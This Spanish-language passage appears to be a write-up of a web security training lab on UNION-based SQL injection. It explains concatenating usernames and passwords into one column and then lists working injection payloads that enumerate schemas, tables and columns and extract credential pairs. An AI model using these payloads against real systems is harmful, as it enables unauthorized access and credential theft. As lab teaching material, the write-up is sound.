La tabla objetivo sigue siendo ‘**users**‘, que contiene los campos ‘**username**‘ y ‘**password**‘.

Pasos clave del ataque:

- Primero confirmamos que la consulta original devuelve dos columnas, pero solo una permite mostrar texto.
- En lugar de intentar mostrar ‘**username**‘ y ‘**password**‘ en columnas separadas (lo que daría error), los concatenamos dentro de la misma columna, usando un separador visible como ~.
- El payload final concatena los valores así: “**username || ‘~’ || password**“. Esto unifica ambos datos en una sola cadena que puede ser mostrada sin errores.

Al enviar esta inyección, la respuesta incluirá los nombres de usuario y sus contraseñas, separados por el símbolo elegido. Finalmente, usamos las credenciales del administrador para iniciar sesión y completar el lab.

**Quédate con esto**: Cuando no puedes mostrar varios valores por separado, combínalos en una sola columna textual. Esta técnica te permite seguir extrayendo información sensible en entornos más restringidos.

----

* Primero debemos de buscar el total de columnas existentes que nos muestra la Web
    + '  (para provocar un error en la consulta)
    + ' order by 2-- -
    + ' union select NULL,schema_name from information_schema.schemata-- -
    + ' union select NULL,table_name from information_schema.tables where table_schema='DB'-- -
    + ' union select NULL,column_name from information_schema.columns where table_schema='DB' and table_name='TABLE'-- -
    + ' union select NULL,username,0x3a,password from DB.TABLE-- -
    + ' union select NULL,username||0x3a||password from DB.TABLE-- -
    + ' union select NULL,username||':'||password from DB.TABLE-- -